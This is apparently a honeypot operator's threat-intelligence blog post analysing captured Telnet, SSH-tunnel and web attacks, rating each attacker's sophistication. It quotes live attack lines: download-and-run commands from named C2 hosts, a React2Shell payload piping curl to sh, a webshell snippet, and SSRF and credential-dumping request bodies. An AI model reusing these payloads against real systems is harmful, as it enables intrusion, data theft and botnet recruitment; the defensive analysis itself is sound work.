---
title: Unsolicited Traffic - Observations from a Distributed Canary Network
slug: unsolicited-traffic-pt1
date_published: 2026-06-07T15:04:55-06:00
date_updated: 2026-06-07T15:04:55-06:00
tags: Threat-Intel, Linux, Oaks-Internet-Safari
description: A global view into unsolicited internet traffic, collected from a distributed network of honeypots and aggregated for analysis. This series explores attacker behavior across regions, highlights emerging patterns, and turns raw telemetry into actionable threat intelligence, with supporting data made available to researchers.
cover: 'banner.png'
author_name: OakAtsume
author_avatar: 'avatars/oak.png'
---

**Larger Scale threat hunting and look at global operations!** </br>
*By: Oak Atsume w/AI assistance* </br>

## Introduction

Hello Everyone, so a lot has changed ever since my last blog.
The operations have greatly expanded, and now we host more Canaries! All thanks to 801Labs of course.
In addition, all of these logs from our Canaries are Semi-Public!! Just shoot an email to oak@801labs.org; 
include details such as *why* you want access, *what* you intent to do, and such. And I'll give you a record access to our Graylog-instance.

In other news, new services are being hosted. WebSpeare has gone thru many updates. From being a basic honeypot.
To a full Tarpit, Decoy and meassuring tool at mass!
In addition, I've been developing/deploying decoys for RTSP!

Things are exapanding greatly. Thanks to your support.
Thank you!

Anywho, the goal of this blog is that of exploring unique Cyber attacks that's hit our decoys!
Let's dig in;



## Let's explore!

Starting on the US East Coast - our `DO-US/New-York/East-Coast` canary - on June 7th, 2026 at around **10:56 UTC**, the host `20.61.127.55` came knocking on Telnet (port 23). Graylog places that IP in **Amsterdam, on a Microsoft Azure range** - so while the box it rattled was in New York, the hand on the other end was reaching across the Atlantic (and almost certainly from a throwaway cloud VM).

It opened politely with a `root/root` login... which failed. No hesitation, no second-guessing - about 0.07 seconds after that first session dropped, it was back with a fresh connection trying `root/admin`. That one worked (well, our honeypot *let* it work). From reconnect to shell? Under half a second.

What followed was textbook bot behaviour, and *fast*. Every command landed roughly a tenth of a second after the last - no human types that cleanly. First a quick look around:

```
uname -s
uname -m
```

Just enough to learn the OS and the CPU architecture, because whatever it drops next has to match the hardware.

Then the main event. It staged a payload by `echo`-ing a base64 blob into `/tmp/1BdjLUybnKbi.sh.b64`, line by line, then decoded it with a whole chain of fallbacks (`base64 -d`, then `openssl`, then `python3`, then `python` - whatever the box happens to have lying around), chmod'd it, and ran it.

The decoded script introduces itself in its own header:

> **Oblivion - Universal Dropper.** POSIX sh - runs on busybox ash, dash, sh. Designed for: routers, cameras, NAS, smart TVs, anything Linux.

And it lives up to the name. Walking through what "Oblivion" actually does:

- **Single-instance lock** - drops a pidfile at `/tmp/.kd` so two copies don't trip over each other.
- **Hunts for a writable + executable directory**, testing `/dev/shm`, `/run`, `/tmp`, `/var/tmp` and friends by *actually* copying `/bin/sh` in and running it (no guessing).
- **Maps `uname -m`** to one of ~15 architectures - aarch64, armv7l, mipsel, sh4, m68k, the works.
- **Downloads its real binary from a secret path** - `http://bin.asusz.qzz.io:80/dl/x9k2m7/oblivion.<arch>` - and it does *not* give up easily: `wget`, then `curl`, then `busybox wget`, and finally a raw `bash` `/dev/tcp` socket if every normal tool is missing.
- **Executes** the binary, falling back to invoking the dynamic linker directly if a plain exec fails.
- **Bolts itself down three different ways**: a `crontab` entry re-pulling `/bin.sh` every 10 minutes, an `/etc/rc.local` hook, and an OpenWrt `/etc/init.d/obl` service.
- **Wipes its own tracks** - unsets `HISTFILE`, clears the shell histories, deletes `.wget-hsts`, removes the lockfile.

But it didn't stop at "infect." After the dropper ran, the bot turned around and **locked the door behind it**:

- Rewrote the root password (`chpasswd`).
- Added a second uid-0 backdoor account, `sysupdx9U`.
- Turned off SSH password auth, set `PermitRootLogin prohibit-password`, and restarted `sshd`.
- Killed and masked `telnetd` - the *very service it walked in through*.
- Shredded the logs: `auth.log`, `secure`, `messages`, `syslog`, `wtmp`, `btmp`, `lastlog`, plus bash history.

That last act is the tell. This isn't just malware spreading - it's a **turf war**. By rotating creds, killing Telnet and hardening SSH, it's slamming the door on every *other* botnet scanning the same way it just did. The device is now "mine, and only mine."

Our canary logged two files pulled down during the session (sha256 `2ae27d6…` and `778e13f…`). The actual `oblivion.<arch>` binary, sadly, we couldn't grab - the C2 (`bin.asusz.qzz.io`) was already offline by the time we went looking. :(

**End goal?** Recruitment. This is a Linux/IoT loader doing exactly what loaders do: brute a weak Telnet cred, fingerprint the hardware, pull the matching ELF, persist, evict the competition, and quietly fold the box into a botnet - most likely for DDoS-for-hire or proxy resale.

### So, how sophisticated was it?

Let's score it honestly, because the entry and the engineering tell two very different stories:

- **The way in:** dirt cheap. `root/admin` over Telnet - **1/10**. This only catches devices that should've been hardened years ago.
- **The loader craft:** genuinely solid. Portable POSIX, four download methods, ~15-architecture support, three persistence mechanisms, plus competitor eviction *and* anti-forensics - **7/10**. Somebody put real care into making this run anywhere and stay there.
- **The operation itself:** pure spray-and-pray automation. No targeting, no human at the keyboard, no novel exploit. ~6 seconds start to finish, fully scripted - and the sub-second, evenly-spaced command timing makes that obvious.

**Overall I'd put it around a 6/10** - a polished, professional commodity loader strapped to the laziest possible entry vector. Nothing here is *novel*, but the engineering is a clear cut above your average copy-pasted Mirai variant. Not the work of a genius; very much the work of a pro.

## The rest of the lineup

That was just the opener. Plenty of other hosts came knocking, and a handful stood out enough to write up. Same deal as above - what they did, and how impressed I was (or wasn't).

### `185.38.149.131` - the one that knew exactly what it was touching

*Telnet (port 23) · seen April 18 → May 22, 2026 · login `root/admin` · origin: United Kingdom/London · ASN: Hydra Communications Ltd / AS25369 </br>*

Most bots have no idea what they've broken into - they just spray Linux commands and hope. Not this one. After logging in, it skipped `uname` entirely and started speaking *telecom*:

```
display deviceInfo
display version
vspa display mg info
sip display register
display sip info
display ip interface
display wifi info
display ssid
```

Those aren't Linux commands - that's the CLI of a **VoIP / SIP media gateway** (looks like Huawei/ZTE-style telco gear). This actor was hunting for a specific class of device and enumerating its SIP registrations, media-gateway state, and WiFi/SSID config. No payload, no download - just careful, hardware-aware recon, then a polite `quit; exit`.

The pacing backs that up: commands landed a **median ~7 seconds apart** (max ~11s) - nothing like the tenth-of-a-second machine-gun from the first sample. Either a human at the keyboard, or a deliberately throttled, device-specific script.

**Sophistication: 7/10.** No exploit and no malware *here*, but the targeting is the whole point - somebody built tooling specifically for telco/VoIP gear and knew the exact commands to ask. That's a real notch above the spray-and-pray crowd. What it intended to do with that info.

### `82.25.63.194` - methodical, and it left a calling card

*Telnet (port 23) · June 3 → 5, 2026 · login `root/admin` · origin: France/Strasbourg · ASN: Dedik Services Limited / AS207043</br>*

This one did its homework before committing. A tidy recon checklist first - kernel, architecture, and crucially *which download tools exist* before picking one:

```
cat /proc/version
echo $PATH
ps
uname -m
wget --version
curl --version
```

Then it pulled the trigger:

```
curl -s http://82.25.63.213/iran.x86_64 -o /tmp/bot
chmod +x /tmp/bot
/tmp/bot &
```

An x86-64 bot named `iran.x86_64`, fetched from a neighbour of its own IP (`82.25.63.213`). The fun part came right after, when it checked its own work:

```
ps aux | grep -E 'iran|t.me/flylegit' | grep -v grep
```

That `t.me/flylegit` is a **Telegram handle baked straight into the grep** - an attribution breadcrumb pointing at the operator's channel. Sloppy of them, and rather useful for us.

**Sophistication: 5/10.** Solid, methodical commodity work - proper recon, clean delivery - but x86-64-only (no multi-arch), and leaking your own Telegram into a process grep is not what careful people do.

### `176.65.148.183` - the busy one, with a rotating wardrobe

*Telnet (port 23) · May 29 → June 4, 2026 · login `admin/admin` · **121 sessions**, 28 downloads · origin: The Netherlands / Eygelshoven · ASN: Pfcloud UG (haftungsbeschrankt) / AS51396 </br>*

Our single noisiest visitor. It opened with the classic Mirai busybox menu-escape - `enable / system / shell / sh` - then ran the textbook multi-arch loader: remount `/tmp` executable, `cd` through a list of writable dirs, and download the same payload built for *every* architecture (arm7, arm6, arm5, mips, mpsl, x86), trying `wget`, then `curl`, then `busybox wget` for each.

What made it stand out wasn't the technique, it was the **infrastructure rotation**. Across its visits the payload server kept changing:

- `209.92.170.225` → binaries named `lmkjn.*`
- `144.172.88.127` → `fvgbh.*`
- `185.228.26.16` → `azsxd.*`

Fresh server, fresh random 5-letter binary name each round. That's someone burning and replacing infrastructure faster than blocklists can keep up.

**Sophistication: 5/10.** The loader itself is bog-standard Mirai lineage, but the operational hygiene - rotating C2s and randomized payload names, at volume - reads like a real botnet operation, not a hobbyist. Goal: classic IoT recruitment, almost certainly DDoS Botnet.

### `31.56.209.72` & `31.56.209.220` - the bouncer

*Telnet (port 23) · late May → early June, 2026 · logins `admin/admin` & `admin/adminHW` · origin: United Arab Emirates  · ASN: Swissnet LLC / AS209373 </br>*

This pair (same `/24`, clearly the same operator) cared less about getting in and more about **owning the place alone**. First it probed writability across paths that only exist on embedded gear:

```
/mnt/jffs2   /mnt/mtd   /jffs   /var/volatile/tmp   /var/lock ...
```

`jffs2` and `mtd` being *router flash partitions* - this thing knows it's sitting on a SOHO router. Then it ran a competitor-killer:

```
for pid in /proc/[0-9]*; do
  ... read "$pid/maps" ...
  case "$line" in */lib/*|*/lib64/*|*.so*) suspicious=false ;; esac
  [ "$suspicious" = true ] && kill -9 "$pid_num"
done
```

In plain English: walk every process, and if its memory maps reference **no shared libraries** - i.e. a statically-linked blob dumped into `/tmp`, the tell-tale signature of *other* IoT malware - kill it. It's evicting rival botnets before installing its own (`cat.sh` / `telnet.sh`).

**Sophistication: 6/10.** The flash-partition awareness and the static-binary heuristic for spotting competitors are genuinely clever touches - more thought went into this than the average loader.

### `85.130.237.235` - four months of knocking, never committed

*Telnet (port 23) · **January 14 → May 25, 2026** (our longest-running visitor) · logins `admin/ADMIN`, `admin/AdmiN*123` · origin: Israel/Tel Aviv · ASN: Bezeq / AS6810 </br>*

This IP came back again and again for *four months*, racking up 134 failed logins and cycling through credential variants. But every time it got in, it ran the same little loop and then... left:

```
enable / system / shell / sh
ping; sh
/bin/busybox cat /proc/self/exe
```

`ping; sh` and `cat /proc/self/exe` are classic **Mirai-family fingerprinting** - the scanner checking whether it's on a real busybox device or a fake/honeypot, and reading its own binary back. It never dropped a payload. Either it never trusted our canary enough to commit, or it's purely a validation/scanning node feeding targets to a separate loader.

**Sophistication: 4/10.** Persistent and disciplined about *not* wasting payloads on suspicious targets - but mechanically it's a dumb, repetitive prober. Notable for endurance, not skill.

### `185.71.233.73` - the bot that couldn't

*SSH (port 22) · May 4 → 9, 2026 · 36 sessions, 138 "commands" · origin: Czechia/Hořovice · ASN: United Networks SE / AS201533 </br>*

And finally, for contrast: the visitor that tried hardest and accomplished the least. Over five days and dozens of SSH sessions, it produced a stream of this:

```
?
apt-get update -y
sudo apt-get update -y
root
admin
?
apt-get update -y
...
```

It's typing `root` and `admin` - its own *credentials* - straight into the shell as if they were commands, interleaved with lonely `apt-get update -y` calls that go nowhere. This is automation that's lost sync with its own session: the script expects a login prompt, gets a shell instead, and just keeps fumbling. No payload, no recon, no point.

**Sophistication: 1/10.** A broken bot stuck in a loop. Included purely because watching it flail for five straight days was the most entertaining thing in the whole capture.

## Borrowing the keys - when attackers tunnel *through* you

Everything above is people trying to break *into* the honeypot. This next bit is the goldmine, because it's people who think they already have, and now want to use the box as **infrastructure** - a free jump host to launder their traffic through.

Cowrie logs SSH `direct-tcpip` channel requests - the "please open a forwarded connection to `host:port` for me" message a client sends when it wants the server to act as a tunnel/proxy. A real admin uses these for `ssh -L`. An attacker who's just "logged in" to our fake box uses them to **pivot**: bounce their traffic off our IP so it's *our* canary that shows up in the victim's logs, not them. Over the window we logged ~**3,550** such forwarding attempts. Sorted by what they were reaching for:

| Destination | Port | Count | What it is |
|---|---|---|---|
| `1.1.1.1` | 53 | 2,851 | DNS - tunnel keepalive |
| Cloudflare `141.101.90.1` | 3478 | 224 | STUN - NAT/exit discovery |
| Google / Apple / AWS | 443 | ~245 | proxy reachability + exit-IP checks |
| `ip-who.com`, `checkip.amazonaws.com` | 80/443 | ~80 | "what's my exit IP?" |
| `81.19.77.166`, `62.210.131.144` | 587 / 2525 | ~57 | **SMTP - outbound spam relay** |

And because Cowrie fingerprints the TLS *inside* the tunnel, we get a JA4/JA4H on the encrypted payload even though we never terminate it - which lets us cluster the tooling. A few distinct operators stood out.

### `87.251.64.176` - the parked tunnel

*SSH `direct-tcpip` · origin: **United States** (AS "ISAEV Igor") · **2,838 forwarding attempts**</br>*

This one IP is responsible for the overwhelming majority of the pivot traffic, and it's doing exactly one thing: every three to six minutes, around the clock, it asks our box to forward a connection to `1.1.1.1:53` and pushes through an *identical* 22-byte DNS packet. Decoded, it's a standard A-record query (transaction ID `0xabcd`) for the domain **`a.to`**:

```
00 16  ab cd 01 00 00 01 00 00 00 00 00 00  01 'a' 02 't''o' 00  00 01 00 01
└len┘  └TXID┘ └flags┘ └QD=1┘               └ a ┘└  to  ┘       └ A ┘└ IN ┘
```

It doesn't care about the *answer*. This is a **keepalive heartbeat** - the operator has parked a persistent tunnel through our canary and pings a known-good resolver every few minutes to confirm the forward still works. We are, as far as they're concerned, a stable piece of their proxy fleet. They've been doing it for months.

**Sophistication: 5/10.** Technically trivial, but operationally telling - somebody is *maintaining* a foothold list and we're on it. The intel value (a live inventory of which boxes a proxy operator believes they own) is the prize here, not the cleverness.

### `185.156.73.233` & the proxy-checker crew

*SSH `direct-tcpip` · origins: **Ukraine, Romania, Iran** · shared JA4 `t12d4312h1_c7886603b240_d89d4c7b8e02`</br>*

Three different IPs - `185.156.73.233` (Ukraine, FOP Dmytro Nedilskyi), `80.94.95.118` (Romania, SS-Net), `77.90.185.17` (Iran) - share the **exact same inner-TLS JA4 fingerprint**, which means they're running the same proxy-checker tool. Each runs a tidy little three-step validation routine through the tunnel, a few seconds apart:

```
TLS → www.google.com         (does this proxy reach the internet?)
TLS → www.apple.com          (captive-portal / connectivity check)
TLS → checkip.amazonaws.com  (what public IP do I look like?)
```

That last one is the giveaway: they're confirming the tunnel's *exit IP* - i.e. checking that traffic sent through our canary actually comes out as our canary's address. This is what you do when you've just acquired a fresh proxy and want to verify it before using (or reselling) it. The shared JA4 across three countries says this is one tool - possibly one operator on rotating hosting, possibly a proxy-checking service that several customers use.

**Sophistication: 6/10.** Disciplined, tool-driven proxy validation with a reused fingerprint that happily ties the three IPs together. The JA4-on-tunnelled-TLS trick is exactly why this category is such good intel: encrypted payload, still attributable.

### The rest of the tunnel crowd

The long tail of `direct-tcpip` rounds out the picture of what a "free" Linux box gets volunteered for:

- **Spam relay** - forwards to `81.19.77.166:587` and `62.210.131.144:2525`, both SMTP submission ports. Classic "send mail through someone else's IP so the spam traces back to them."
- **NAT discovery** - `45.148.10.121` (Netherlands) fired 224 STUN requests at Cloudflare's `:3478`, profiling the tunnel's NAT behaviour like a P2P client would.
- **Traffic laundering** - bulk `:443` forwards to Google, Amazon, and Akamai ranges: general-purpose anonymisation, scraping, or account abuse routed through us.
- **Tor on top of the pivot** - a small cluster (`192.42.116.14`, `192.42.116.97`, `185.220.101.184`) carries a *different* shared JA4 (`t12d3112h2_…`) and resolves to **known Tor exit nodes**. Someone chaining Tor → our canary → target, for belt-and-braces anonymity.

The hosting tells its own story: nearly every pivoter sits on offshore/bulletproof-flavoured networks - "Offshore LC" (Luxembourg), "Unmanaged Ltd" (Romania), "Limited Network" (Iran), "Netiface LLC" (UAE). These aren't compromised home routers; they're rented launch pads, using our canary as one more hop to put between themselves and whatever they're really doing.

**Why this category matters:** a brute-force log tells you someone *knocked*. A `direct-tcpip` log tells you someone walked in, pulled up a chair, and started using your address as their own. It's the difference between watching attacks and watching attackers conduct *operations* - and the destinations, timing, and JA4s give us a fingerprintable handle on each one.

## Switching tracks - the Web (WebSpeare)

Telnet and SSH are where the botnets live, but the *web* honeypot is where the volume is. Over a rolling 90-day window, **WebSpeare logged ~181,000 requests** - and the shape of that traffic tells a very different story to the shell honeypots.

A few things jump straight out of the aggregates:

- **Method:** `GET` 173.6k · `POST` 4.7k · `PROPFIND` 1.7k (WebDAV scanning) · plus a smattering of garbage verbs like `DHUP`, `JJZZ`, `ISWG` - malformed nonsense from broken scanners and people fuzzing our parser.
- **Top countries:** France **90.7k**, USA 38.5k, UK 8.1k, Hong Kong 5.8k, Germany 5.4k, Netherlands 5.3k.
- **Top networks:** Bucklog SARL **67.9k**, 3xK Tech GmbH 24.9k, then the usual cloud crowd - Amazon, Microsoft, Tencent, DigitalOcean - and Censys at 7.5k.

That French number is not organic. Almost all of it is a single block - **`185.177.72.0/24` (Bucklog SARL)** - which on its own accounts for ~**39,000** "Secret File Enumeration" hits and ~**28,000** `curl` requests. One subnet, hammering `curl http://<us>/.env` and friends around the clock. France didn't suddenly take an interest in us; one operator on cheap French hosting did.

### The headline: everybody wants your `.env`

If you collapse the WAF rules, one category towers over everything:

| WAF rule | Hits |
|---|---|
| Secret File Enumeration (Env/Git/Backup) | **75,849** |
| CLI Tool – Curl | 28,850 |
| Internet Indexer – Censys/Odin/NetScope | 8,738 |
| Suspicious – Minimalist User-Agent | 3,882 |
| Scripting Library – Go HTTP Client | 3,606 |
| Generic Webshell Discovery | 2,109 |
| Mass Scanner – ZGrab/Masscan | 1,912 |
| Androxgh0st Malware Probe | 1,838 |

And it shows in the requested paths - after `/` itself, the single most-requested URL on the whole honeypot is **`/.env`** (4,915 hits), trailed by `/.git/config`, `/.env.production`, `/.env.local`, `/config.json`, `/wp-config.php`, `/dump.sql`, and - my favourite for sheer optimism - **`/.aws/credentials`** (357). The modern opportunistic attacker doesn't even bother with an exploit first; they just ask, politely and at scale, for your secrets to be lying around in a world-readable file. Depressingly often, somewhere on the internet, they are.

That's the ambient noise. Now the interesting stuff.

### `45.198.224.22` - React2Shell (CVE-2025-55182), caught in the wild

*HTTP `POST /` · June 6, 2026 · origin: **Sweden** · User-Agent: `Assetnote/1.0.0`</br>*

This is the one that made me sit up. A `POST` to `/` carrying a multipart body and a `Next-Action` header - i.e. a **Next.js Server Action** call - abusing the React Server Components deserializer for remote code execution:

```json
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,
 "value":"{\"then\":\"$B1337\"}",
 "_response":{"_prefix":"var res=process.mainModule.require('child_process')
   .execSync('(curl http://vitacocoyougoloco.potassium.st/r | sh) ; echo 11111')...",
   "_formData":{"get":"$1:constructor:constructor"}}}
```

Look at the `$1:__proto__:then` and `$1:constructor:constructor` markers - that's **prototype-pollution-driven gadget abuse** in the RSC payload parser, pivoting into a plain `child_process.execSync` that runs `curl http://vitacocoyougoloco.potassium.st/r | sh`. Classic "download stage two and pipe to shell," just wrapped in a very 2026 framework-specific delivery.

The `Assetnote/1.0.0` user-agent is telling: that's an attack-surface-management toolkit, so this is either a researcher mass-validating the CVE or someone who borrowed their fingerprint. Either way it was fully automated and sprayed at our `/` with no prior recon.

**Sophistication: 8/10.** Real, current CVE; a non-trivial deserialization gadget chain rather than a copy-paste shell one-liner. The *delivery* is cutting-edge; the *follow-through* (`curl | sh`) is as old as dirt. C2: `vitacocoyougoloco.potassium.st`;

### `/SDK/webLanguage` - Hikvision CVE-2021-36260

*HTTP `GET /SDK/webLanguage` · origins incl. **Seychelles** (Amarutu Technology), **UK** (UAB Host Baltic)</br>*

513 requests went to `/SDK/webLanguage` - the endpoint for the **Hikvision IP-camera command-injection bug, CVE-2021-36260**. A still-unpatched Hikvision NVR/camera will happily run commands smuggled into that XML body. The requests came dressed in a believable Edge-on-Windows user-agent and an `X-Requested-With: XMLHttpRequest` header to look like the camera's own web UI.

A four-year-old camera CVE is *still* one of the most-probed exploits we see - because the install base of never-updated cameras is effectively permanent.

**Sophistication: 4/10.** Bog-standard CVE spraying, but a sharp reminder that IoT-camera exploitation never went away - it just got automated and folded into the background scan traffic.

### Androxgh0st & friends - the `.env` botnet with a name

*HTTP `POST /` · origin: **UK** (Hostglobal.plus), IPs `78.153.140.0/24`</br>*

1,838 requests tripped the **Androxgh0st** signature - a long-running botnet that specialises in scraping leaked `.env` files (Laravel apps especially) for AWS keys, mail creds, and database passwords, then using them to send spam or rack up cloud bills. Ours showed up as `POST /` floods from a tidy `78.153.140.0/24` block on UK hosting. It's the organised, branded cousin of all that anonymous `/.env` noise above.

**Sophistication: 5/10.** Commodity, but *effective* commodity - Androxgh0st stays in business precisely because the `.env`-leak problem never gets fixed.

### `151.243.150.23` - straight for the SSH keys

*HTTP `GET /.ssh/id_rsa` · June 6, 2026 · origin: **Germany**</br>*

Short and to the point: this host did nothing but hammer `GET /.ssh/id_rsa` and `GET /.ssh/id_dsa`, over and over, hoping a webserver was misconfigured to serve a home directory. No exploit, no cleverness - just someone who knows that *one* exposed private key is worth more than a thousand failed `.env` grabs. 330 such attempts hit the WAF over the window.

**Sophistication: 2/10.** Pure long-odds lottery - but the payoff if it ever lands is somebody's entire infrastructure.

### Honourable mentions

The long tail is a museum of "exploits that refuse to die": **Shellshock** (186), the **PHPUnit `eval-stdin` RCE** probe (232), **RedTail's PHP-CGI argument-injection CVE-2024-4577** (181, via `/hello.world`), **F5 BIG-IP CVE-2020-5902** (16), LuCI router probes, and a steady drizzle of `ZGrab`/`Masscan` and Censys indexing. Nothing here is new - but every single one is still being fired at us *today*, which is the whole point.

## Finding needles - when the WAF shrugs

Here's the real problem with a web honeypot: **volume**. 181,000 requests, and the WAF can only label what it already has a signature for. Everything genuinely *new* - a fresh CVE, a clever SSRF, a framework nobody's written a rule for yet - lands in the logs as "uncategorised" and drowns in the `.env` noise. The WAF is a great filter for *known* attacks and a terrible source of truth for *interesting* ones.

So I stopped trusting it. WebSpeare deliberately leaves request bodies as untouched as it can (parsing them invites injection - and ironically the React2Shell payload above will happily *break* a naive parser), and it sets a `malformed: true` flag whenever a body doesn't cleanly parse as what it claims to be. That flag turns out to be a far better "something weird is here" signal than the WAF rules. The single most productive query I have is:

```lucene
malformed:true AND NOT wafRule:*
```

"Show me everything weird that no signature caught." That one line is where the needles live. Here's what it pulled out.

### `176.163.147.164` & friends - one operator, a dozen doors

*HTTP · June 8, 2026 · origin: **France** (Bouygues / Free / SFR - residential) · routed through a residential proxy</br>*

Every request from this host carried a header it shouldn't have: `Proxy-Authorization`. Decoded, it's the operator's **commercial proxy account leaking straight into our logs**:

```
3a544ff56e6b7f940512__cr.fr : a5854d608a4e3380
         └─ "_cr.fr" = France geo-routing tag
```

That exact credential shows up on **four different French consumer IPs** - `176.163.147.164`, `37.167.49.21`, `80.215.189.44`, `92.88.154.123` (Bouygues, Free Mobile, SFR). One operator, buying residential egress through French eyeball networks to look like ordinary home users, rotating User-Agent and `Host` header on every request. The leaked proxy token is the thread that ties all four together.

And what they're doing is the interesting part. This is **not** the dumb `/.env` GET-spray from earlier - it's a *technology-agnostic credential harvester*. The same goal (dump `env` / secrets) fired through whatever RCE or SSRF primitive each framework hands them:

```http
POST /api/fetch     → url=http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS IMDS SSRF
POST /run/.../kube-proxy → {Pod "kgb-exploit": cat /var/run/secrets/.../token}                # Kubernetes
POST /images/json   → {"Image":"alpine","Cmd":["env"]}                                         # Docker Engine API
POST /graphql/api/url → mutation { executeCommand(cmd:"env") }                                  # GraphQL injection
POST /refresh       → {"spring.cloud.bootstrap.location":"http://malicious.server/yaml"}        # Spring Cloud RCE
POST /_next/.../index.json → {"__proto__":{"isServer":true,"shell":"cat .env"}}                 # Next.js proto-pollution
POST /vendor/.../eval-stdin.php → <?php system("find / -name .env ... xargs cat"); ?>           # PHPUnit RCE
GET  /_ignition/execute-solution                                                                # Laravel Ignition RCE
GET  /actuator/heapdump                                                                          # Spring Boot → memory secrets
```

Here's the kicker: of the requests from this cluster, the WAF tagged a healthy chunk - but it left the **Kubernetes pod-exploit, the GraphQL injection, the Spring Cloud RCE, and the Next.js prototype-pollution with an empty `wafRule`.** No signature, no flag. The only thing that caught them was `malformed: true`. If I'd trusted the WAF, this entire operator would have read as background `.env` noise.

**Sophistication: 8/10.** One goal, a dozen modern doors, real OPSEC (residential proxy, rotating fingerprints) - undone by one leaked header. This is a capable, current operator, not a script kiddie. The leaked proxy creds are the kind of mistake that gets a whole campaign attributed.

### The other needles the same query pulled out

Once you're fishing in `malformed:true AND NOT wafRule:*`, the WAF's blind spots light up:

- **`64.89.163.38` (Netiface America) - a purpose-built Next.js RSC toolkit.** It walks a methodical escalation ladder against `/api/rsc`, `/rsc`, `/api/[...catchall]`, even `/next.config.js`: baseline probe → `__next_router_state_tree` injection → prototype pollution → `${JSON.stringify(process.env)}` template leak → finally SSRF with `{"__rsc":{"id":"http://169.254.169.254/.../iam/security-credentials/"}}`. Same env-stealing goal as the French cluster, but specialised entirely in React Server Components. It also tried to drop a **Gravity Forms PHAR webshell** (`<?=\`$_GET[0]\`;?>`) that the WAF dismissed as a "minimalist user-agent."
- **`182.246.46.144` (China, Chinanet) - hunting for free LLMs.** A `POST /v1/chat/completions` carrying `{"model":"gpt-4o","messages":[{"role":"user","content":"ping，只回复 pong"}],"max_tokens":8}` (and a `deepseek-v4-pro` variant). That's not a website attack at all - it's someone scanning for **exposed, unauthenticated LLM API proxies** to piggyback on. A genuinely 2026-flavoured probe, and exactly the sort of thing no traditional WAF has a rule for.
- **`185.56.45.114` (Canada) - React2Shell, again.** Another crack at CVE-2025-55182, this time with a multipart boundary literally named `------CVE2025Boundary` - a PoC-tool fingerprint that betrays exactly which exploit kit fired it.

None of these would have surfaced by sorting the WAF rule column. They surfaced because the body *didn't parse* - which, when you're being attacked, is frequently the most honest signal you've got.

### The needles, in detail (the long, boring version)

If you want the forensic granularity - user-agents, request cadence, the exact order of operations - here it is. Skip to the cameras if telemetry isn't your thing.

#### Needle 1 - the French proxy cluster (`176.163.147.164` et al.)

**Infrastructure.** Four source IPs, three different French *consumer* ISPs - `176.163.147.164` & `80.215.189.44` (Bouygues Telecom), `37.167.49.21` (Free Mobile), `92.88.154.123` (SFR) - all presenting the identical leaked `Proxy-Authorization: Basic …` (account `3a544ff56e6b7f940512__cr.fr`). That's the signature of a commercial residential-proxy service with France-pinned egress: the operator is somewhere else entirely, renting "real home user in France" exit nodes by the request.

**User-Agent rotation.** Across one 113-request session, `176.163.147.164` cycled through *five* distinct browser identities - and the distribution is suspiciously even:

| User-Agent | Count |
|---|---|
| `Chrome/121.0.0.0` (Windows) | 33 |
| `Chrome/120.0.0.0` (X11; Linux) | 23 |
| `Firefox/122.0` (Windows) | 22 |
| `Safari/17.2.1` (macOS) | 22 |
| `Safari` (iPhone; iOS 17.3) | 13 |

No real user base looks like that. It's a hard-coded UA pool, rotated per request to defeat naive user-agent rate-limiting. The tell: a "Windows Chrome" and an "iPhone Safari" don't take turns `POST`ing a Kubernetes Pod spec to `/run/default/kube-proxy`.

**Host-header rotation.** The `Host` header changed almost every request - dozens of values in one session: real domains (`bluekern.com`, `atlanticsearch.com`, `blackopsdestruction.com`, `axxonn.club`, `allopneus.net`, `assurancebureauxetudes.fr`, `bentley.co.nz`, `antidotodesign.com.br`, `589onxrpl.com`) interleaved with bare IPs that are mostly AWS/DigitalOcean ranges (`3.8.10.44`, `3.215.78.201`, `34.253.89.78`, `18.229.110.92`, `188.166.224.236`, `206.189.161.23`). In other words, our sensor is just one line in a large target list, and the toolkit replays its whole arsenal against each entry, carrying the intended victim's hostname along for the ride.

**Timing.** All 113 requests landed in a single unbroken burst - **02:21:03 → 02:24:07 UTC on 2026-06-08, 184 seconds end-to-end**. Distinct probes arrived every ~2–4 seconds; you'll also see ~60-millisecond twin entries on most lines, but since that exact pairing shows up across *unrelated* attackers it's almost certainly how the sensor records a request, not the client double-firing. Either way: no human drives a browser at four-distinct-attacks-per-ten-seconds for three minutes straight. Fully automated.

**Order of operations.** The sequence is a methodical arsenal sweep, not random fuzzing:

```
02:21:03  GET   /.env.local, /website.zip, /.env.prod, /.env …      ← cheap secret-file GETs first
02:21:22  GET   /actuator/heapdump, /actuator/env, /digitalocean.json
02:21:31  POST  /_ignition/execute-solution                          ← escalate to framework RCE
02:21:37  POST  /vendor/phpunit/.../eval-stdin.php                    ← PHPUnit RCE
02:21:53  POST  /fetch, /api/fetch, /api/proxy  (IMDS SSRF bodies)    ← cloud-cred SSRF
02:22:15  GET   /images/json, /containers/json   (Docker API)
02:22:43  POST  /_next/data/.../index.json        (Next.js proto-pollution)
02:22:47  POST  /refresh                          (Spring Cloud RCE)
02:22:55  POST  /graphql/api/url                  (GraphQL command injection)
02:23:18  POST  /run/default/kube-proxy           (Kubernetes Pod injection)
```

It opens with the no-risk reads, then walks up the value ladder into RCE/SSRF, cycling the same set repeatedly as the `Host` target rotates. **Rating: 8/10** - disciplined, multi-stack, current, with real (if leaky) OPSEC.

#### Needle 2 - the Next.js RSC + WordPress toolkit (`64.89.163.38`)

**Infrastructure.** Single IP, `64.89.163.38` (Netiface America, geo-located UK). No proxy header - this one isn't hiding. But it's the heavyweight by volume: **2,381 requests**, versus 113 for the French cluster.

**User-Agent.** Barely rotates - almost everything is `Chrome/120.0.0.0` (Windows), with an occasional bare `Mozilla/5.0`. That stripped-down `Mozilla/5.0` is the *only* thing the WAF reacted to (it fired "Suspicious – Minimalist User-Agent"), which is exactly backwards: the bland Chrome string carrying an actual webshell sailed straight through.

**The `.env` wordlist.** Where the French cluster fired a handful of `.env` names, this toolkit carries an *exhaustive, platform-aware* dictionary. Two axes:

- **Directory prefixes:** `/common/.env`, `/shared/.env`, `/local/.env`, `/stage/.env`, `/test/.env`, `/dev/.env`, `/prod/.env`, `/release/.env`, `/build/.env`, `/dist/.env`, `/deploy/.env`, `/core/.env`, `/portal/.env`, `/admin/.env`, `/api/v1/.env`, `/app/backend/.env`, `/server/.env`, `/storage/.env`, `/src/.env`, `/private/.env` … (~30 of them).
